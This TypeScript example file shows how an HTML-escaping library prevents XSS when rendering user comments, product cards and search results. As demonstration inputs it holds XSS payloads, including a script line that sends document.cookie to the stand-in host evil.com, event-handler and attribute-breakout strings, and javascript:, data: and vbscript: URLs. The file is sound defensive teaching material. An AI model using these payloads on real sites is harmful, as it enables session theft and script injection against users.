// noinspection JSUnusedGlobalSymbols - Example file

/**
 * HTML Escaping Example - XSS Prevention and Safe HTML Generation
 *
 * This example demonstrates:
 * - Escaping user input to prevent XSS attacks
 * - Building safe HTML strings
 * - Sanitizing URLs for href/src attributes
 * - Creating secure templates
 * - Common XSS attack vectors and prevention
 *
 * SECURITY NOTE: Always escape untrusted content before inserting into HTML.
 * When possible, use textContent instead of innerHTML for even better security.
 *
 * @packageDocumentation
 */

import { HtmlEscaper } from '@zappzarapp/browser-utils/html';

// =============================================================================
// Types
// =============================================================================

/**
 * User-submitted comment data.
 */
interface UserComment {
  readonly id: string;
  readonly author: string;
  readonly content: string;
  readonly website?: string;
  readonly avatar?: string;
  readonly timestamp: Date;
}

/**
 * Product listing data.
 */
interface Product {
  readonly id: string;
  readonly name: string;
  readonly description: string;
  readonly price: number;
  readonly imageUrl?: string;
}

/**
 * Search result item.
 */
interface SearchResult {
  readonly title: string;
  readonly url: string;
  readonly snippet: string;
}

// =============================================================================
// Basic Escaping
// =============================================================================

/**
 * Demonstrate basic HTML escaping.
 */
function basicEscapingExample(): void {
  console.log('--- Basic HTML Escaping ---');

  // Simple text escaping
  const userInput = '<script>alert("XSS")</script>';
  const escaped = HtmlEscaper.escape(userInput);

  console.log('Original:', userInput);
  console.log('Escaped:', escaped);
  // Output: &lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;

  // All special characters are escaped
  const specialChars = 'Test & "quotes" <tags> \'apostrophe\' `backtick`';
  console.log('Special chars:', HtmlEscaper.escape(specialChars));
  // Output: Test &amp; &quot;quotes&quot; &lt;tags&gt; &#039;apostrophe&#039; &#x60;backtick&#x60;

  // Empty and null-like values are handled safely
  console.log('Empty string:', HtmlEscaper.escape(''));
  console.log('Whitespace:', HtmlEscaper.escape('   '));
}

/**
 * Demonstrate attribute escaping.
 */
function attributeEscapingExample(): void {
  console.log('\n--- Attribute Escaping ---');

  // Attribute values need more aggressive escaping
  const attrValue = 'onclick="evil()" data-foo="bar"';
  const escaped = HtmlEscaper.escapeAttr(attrValue);

  console.log('Original:', attrValue);
  console.log('Escaped:', escaped);
  // Output: onclick=&quot;evil()&quot; data-foo=&quot;bar&quot;

  // Forward slashes are also escaped in attributes
  const pathValue = '/path/to/file';
  console.log('Path escaped:', HtmlEscaper.escapeAttr(pathValue));
  // Output: &#x2F;path&#x2F;to&#x2F;file
}

/**
 * Demonstrate text truncation with escaping.
 */
function truncationExample(): void {
  console.log('\n--- Truncation with Escaping ---');

  const longText = 'This is a <b>very long</b> text that needs to be truncated safely.';

  // Truncate to 30 characters
  const truncated = HtmlEscaper.truncate(longText, 30);
  console.log('Truncated (30):', truncated);

  // Custom suffix
  const withSuffix = HtmlEscaper.truncate(longText, 30, ' [...]');
  console.log('Custom suffix:', withSuffix);

  // Short text is not truncated
  const shortText = '<b>Hello</b>';
  console.log('Short text:', HtmlEscaper.truncate(shortText, 100));
}

// =============================================================================
// URL Sanitization
// =============================================================================

/**
 * Demonstrate URL safety checks and sanitization.
 */
function urlSanitizationExample(): void {
  console.log('\n--- URL Sanitization ---');

  // Safe URLs
  const safeUrls = [
    'https://example.com',
    'http://localhost:3000',
    '/relative/path',
    './relative/file.html',
    '#anchor',
    'mailto:user@example.com',
  ];

  console.log('Safe URLs:');
  for (const url of safeUrls) {
    console.log(`  ${url}: ${HtmlEscaper.isSafeUrl(url) ? 'SAFE' : 'UNSAFE'}`);
  }

  // Dangerous URLs (XSS vectors)
  const dangerousUrls = [
    'javascript:alert("XSS")',
    'JAVASCRIPT:alert(1)',
    '  javascript:void(0)',
    'data:text/html,<script>alert(1)</script>',
    'vbscript:msgbox("XSS")',
  ];

  console.log('\nDangerous URLs:');
  for (const url of dangerousUrls) {
    console.log(`  ${url}: ${HtmlEscaper.isSafeUrl(url) ? 'SAFE' : 'UNSAFE'}`);
  }

  // Sanitize URL for use in href
  const untrustedUrl = 'javascript:alert("hack")';
  const sanitized = HtmlEscaper.sanitizeUrl(untrustedUrl);
  console.log('\nSanitized dangerous URL:', sanitized || '(empty - blocked)');
}

// =============================================================================
// Safe Tag Building
// =============================================================================

/**
 * Demonstrate building safe HTML tags.
 */
function tagBuildingExample(): void {
  console.log('\n--- Safe Tag Building ---');

  // Simple tag with content
  const span = HtmlEscaper.tag('span', { class: 'highlight' }, 'Hello <World>');
  console.log('Span:', span);
  // Output: <span class="highlight">Hello &lt;World&gt;</span>

  // Tag with multiple attributes
  const link = HtmlEscaper.tag(
    'a',
    {
      class: 'btn btn-primary',
      id: 'my-link',
      'data-action': 'click',
      target: '_blank',
    },
    'Click Me'
  );
  console.log('Link:', link);

  // Boolean attributes
  const checkbox = HtmlEscaper.tag(
    'input',
    {
      type: 'checkbox',
      checked: true,
      disabled: false, // false = attribute not added
    },
    null // self-closing
  );
  console.log('Checkbox:', checkbox);

  // Self-closing tags (null content)
  const image = HtmlEscaper.tag(
    'img',
    {
      alt: 'Product image',
      class: 'thumbnail',
    },
    null
  );
  console.log('Image:', image);

  // Dangerous attributes are automatically filtered
  const safeDiv = HtmlEscaper.tag(
    'div',
    {
      class: 'safe',
      onclick: 'evil()', // This will be filtered out!
      'data-id': '123',
    },
    'Safe content'
  );
  console.log('Div (onclick filtered):', safeDiv);
  // Note: onclick attribute is NOT in the output
}

// =============================================================================
// Common XSS Vectors
// =============================================================================

/**
 * Demonstrate protection against common XSS attack vectors.
 */
function xssPreventionExample(): void {
  console.log('\n--- XSS Prevention Examples ---');

  // Attack vector 1: Script injection
  const scriptInjection =
    '<script>document.location="http://evil.com/?c="+document.cookie</script>';
  console.log('Script injection:');
  console.log('  Attack:', scriptInjection);
  console.log('  Safe:', HtmlEscaper.escape(scriptInjection));

  // Attack vector 2: Event handler injection
  const eventInjection = '" onmouseover="alert(1)"';
  console.log('\nEvent handler injection:');
  console.log('  Attack:', eventInjection);
  console.log('  Safe:', HtmlEscaper.escapeAttr(eventInjection));

  // Attack vector 3: JavaScript URL
  const jsUrl = 'javascript:alert(document.cookie)';
  console.log('\nJavaScript URL:');
  console.log('  Attack:', jsUrl);
  console.log('  Safe:', HtmlEscaper.sanitizeUrl(jsUrl) || '(blocked)');

  // Attack vector 4: Breaking out of attributes
  const attrBreakout = '"><img src=x onerror=alert(1)>';
  console.log('\nAttribute breakout:');
  console.log('  Attack:', attrBreakout);
  console.log('  Safe:', HtmlEscaper.escapeAttr(attrBreakout));

  // Attack vector 5: HTML entity abuse
  const entityAbuse = '&lt;script&gt;'; // Already escaped, don't double-escape
  console.log("\nEntity abuse (don't double-escape):");
  console.log('  Input:', entityAbuse);
  console.log('  Escaped:', HtmlEscaper.escape(entityAbuse));
}

// =============================================================================
// Practical Examples
// =============================================================================

/**
 * Render a user comment safely.
 */
function renderComment(comment: UserComment): string {
  // Sanitize all user-provided data
  // Note: HtmlEscaper.tag() automatically escapes content, so we only need
  // to escape values used in manual string concatenation
  const safeAuthor = HtmlEscaper.escape(comment.author);
  const safeWebsite = comment.website !== undefined ? HtmlEscaper.sanitizeUrl(comment.website) : '';
  const safeAvatar = comment.avatar !== undefined ? HtmlEscaper.sanitizeUrl(comment.avatar) : '';

  // Build safe HTML
  let html = '<div class="comment">';

  // Avatar (if provided and safe)
  if (safeAvatar !== '') {
    html += HtmlEscaper.tag(
      'img',
      {
        class: 'comment-avatar',
        alt: `${safeAuthor}'s avatar`,
      },
      null
    );
    // Manually add src since it's a "dangerous" attribute we've already sanitized
    html = html.replace('/>', ` src="${safeAvatar}" />`);
  }

  // Author name (with optional link)
  if (safeWebsite !== '') {
    html += `<a href="${safeWebsite}" class="comment-author" rel="nofollow noopener" target="_blank">${safeAuthor}</a>`;
  } else {
    html += HtmlEscaper.tag('span', { class: 'comment-author' }, comment.author);
  }

  // Timestamp
  html += HtmlEscaper.tag(
    'time',
    {
      class: 'comment-time',
      datetime: comment.timestamp.toISOString(),
    },
    comment.timestamp.toLocaleDateString()
  );

  // Content
  html += HtmlEscaper.tag('p', { class: 'comment-content' }, comment.content);

  html += '</div>';

  return html;
}

/**
 * Example: Render comments safely.
 */
function commentRenderingExample(): void {
  console.log('\n--- Comment Rendering ---');

  // Malicious comment attempt
  const maliciousComment: UserComment = {
    id: '1',
    author: '<script>alert("XSS")</script>',
    content: 'Check out my site!" onclick="evil()">Click',
    website: 'javascript:alert("hacked")',
    timestamp: new Date(),
  };

  const safeHtml = renderComment(maliciousComment);
  console.log('Malicious comment rendered safely:');
  console.log(safeHtml);

  // Normal comment
  const normalComment: UserComment = {
    id: '2',
    author: 'John Doe',
    content: 'This is a great article! Thanks for sharing.',
    website: 'https://johndoe.com',
    timestamp: new Date(),
  };

  console.log('\nNormal comment:');
  console.log(renderComment(normalComment));
}

/**
 * Render a product card safely.
 */
function renderProductCard(product: Product): string {
  const safeImageUrl =
    product.imageUrl !== undefined ? HtmlEscaper.sanitizeUrl(product.imageUrl) : '';

  let html = '<div class="product-card">';

  // Product image
  if (safeImageUrl !== '') {
    html += `<img class="product-image" src="${safeImageUrl}" alt="${HtmlEscaper.escapeAttr(product.name)}" />`;
  }

  // Product name
  html += HtmlEscaper.tag('h3', { class: 'product-name' }, product.name);

  // Description (truncated)
  html += HtmlEscaper.tag(
    'p',
    { class: 'product-description' },
    // Use truncate to limit and escape
    HtmlEscaper.truncate(product.description, 150).replace(/&lt;/g, '<').replace(/&gt;/g, '>')
  );
  // Note: We need to re-escape since truncate already escaped
  html = html.replace(
    /<p class="product-description">[^<]*<\/p>/,
    `<p class="product-description">${HtmlEscaper.truncate(product.description, 150)}</p>`
  );

  // Price
  html += HtmlEscaper.tag('span', { class: 'product-price' }, `$${product.price.toFixed(2)}`);

  html += '</div>';

  return html;
}

/**
 * Example: Render product cards.
 */
function productCardExample(): void {
  console.log('\n--- Product Card Rendering ---');

  const product: Product = {
    id: '123',
    name: 'Wireless Mouse <Premium>',
    description:
      'A high-quality wireless mouse with ergonomic design. Features include: <ul><li>2.4GHz connectivity</li><li>Long battery life</li></ul>',
    price: 29.99,
    imageUrl: 'https://example.com/mouse.jpg',
  };

  console.log('Product card:');
  console.log(renderProductCard(product));
}

/**
 * Render search results safely.
 */
function renderSearchResults(results: readonly SearchResult[]): string {
  let html = '<div class="search-results">';

  for (const result of results) {
    const safeUrl = HtmlEscaper.sanitizeUrl(result.url);

    // Skip results with dangerous URLs
    if (safeUrl === '') {
      console.warn('Blocked dangerous URL in search result:', result.url);
      continue;
    }

    html += '<div class="search-result">';

    // Title as link
    html += `<a href="${safeUrl}" class="result-title">${HtmlEscaper.escape(result.title)}</a>`;

    // URL display
    html += HtmlEscaper.tag('cite', { class: 'result-url' }, result.url);

    // Snippet
    html += HtmlEscaper.tag('p', { class: 'result-snippet' }, result.snippet);

    html += '</div>';
  }

  html += '</div>';

  return html;
}

/**
 * Example: Render search results.
 */
function searchResultsExample(): void {
  console.log('\n--- Search Results Rendering ---');

  const results: SearchResult[] = [
    {
      title: 'Learn JavaScript <Basics>',
      url: 'https://example.com/js-tutorial',
      snippet: 'A comprehensive guide to learning JavaScript fundamentals...',
    },
    {
      title: 'Hacked Site',
      url: 'javascript:alert("XSS")',
      snippet: 'This result has a malicious URL',
    },
    {
      title: 'HTML & CSS Guide',
      url: 'https://example.com/html-css',
      snippet: 'Master HTML5 & CSS3 with practical examples...',
    },
  ];

  console.log('Search results (malicious URL blocked):');
  console.log(renderSearchResults(results));
}

// =============================================================================
// Best Practices
// =============================================================================

/**
 * Demonstrate best practices for XSS prevention.
 */
function bestPracticesExample(): void {
  console.log('\n--- Best Practices ---');

  // Best Practice 1: Use textContent instead of innerHTML when possible
  console.log('1. Prefer textContent over innerHTML:');
  console.log('   element.textContent = userInput; // Safe, no escaping needed');
  console.log('   element.innerHTML = HtmlEscaper.escape(userInput); // Also safe');

  // Best Practice 2: Always escape in the template
  console.log('\n2. Escape at the template level:');
  const template = (name: string) => `<p>Hello, ${HtmlEscaper.escape(name)}!</p>`;
  console.log('   Template:', template('<script>evil()</script>'));

  // Best Practice 3: Validate URLs before using
  console.log('\n3. Validate URLs before use:');
  const userUrl = 'javascript:alert(1)';
  if (HtmlEscaper.isSafeUrl(userUrl)) {
    console.log('   URL is safe to use');
  } else {
    console.log('   URL is dangerous, blocked:', userUrl);
  }

  // Best Practice 4: Use the tag builder for dynamic HTML
  console.log('\n4. Use tag builder for dynamic attributes:');
  const dynamicTag = HtmlEscaper.tag('button', { 'data-user': '<script>x</script>' }, 'Click');
  console.log('   Dynamic tag:', dynamicTag);

  // Best Practice 5: Defense in depth
  console.log('\n5. Defense in depth:');
  console.log('   - Escape all user input (HtmlEscaper.escape)');
  console.log('   - Use Content Security Policy (CSP)');
  console.log('   - Validate input on server side too');
  console.log('   - Use HttpOnly cookies for sensitive data');
}

// =============================================================================
// Run All Examples
// =============================================================================

/**
 * Run all HTML escaping examples.
 */
export function runHtmlEscapingExamples(): void {
  console.log('=== HTML Escaping Examples ===\n');

  basicEscapingExample();
  attributeEscapingExample();
  truncationExample();
  urlSanitizationExample();
  tagBuildingExample();
  xssPreventionExample();
  commentRenderingExample();
  productCardExample();
  searchResultsExample();
  bestPracticesExample();

  console.log('\n=== HTML Escaping Examples Complete ===');
}

// =============================================================================
// Exports
// =============================================================================

export {
  basicEscapingExample,
  attributeEscapingExample,
  truncationExample,
  urlSanitizationExample,
  tagBuildingExample,
  xssPreventionExample,
  renderComment,
  renderProductCard,
  renderSearchResults,
  bestPracticesExample,
  type UserComment,
  type Product,
  type SearchResult,
};

// Uncomment to run directly
// runHtmlEscapingExamples();
